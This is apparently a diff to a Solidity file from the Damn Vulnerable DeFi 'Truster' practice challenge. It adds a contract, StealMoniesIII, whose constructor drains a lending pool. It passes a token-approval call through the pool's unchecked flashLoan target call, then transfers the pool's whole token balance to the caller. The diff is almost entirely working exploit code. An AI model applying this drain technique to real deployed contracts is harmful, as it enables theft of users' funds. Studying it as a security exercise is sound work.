@@ -5,6 +5,17 @@ pragma solidity ^0.8.0;
 import "@openzeppelin/contracts/utils/Address.sol";
 import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
 import "../DamnValuableToken.sol";
+import "hardhat/console.sol";
+
+
+contract StealMoniesIII {
+    constructor(TrusterLenderPool pool, DamnValuableToken token) {
+        bytes memory approvalCall = abi.encodeWithSelector(token.approve.selector, address(this), type(uint256).max);
+        pool.flashLoan(0, address(this), address(token), approvalCall);
+        token.transferFrom(address(pool), msg.sender, token.balanceOf(address(pool)));
+    }
+}
+
 
 /**
  * @title TrusterLenderPool
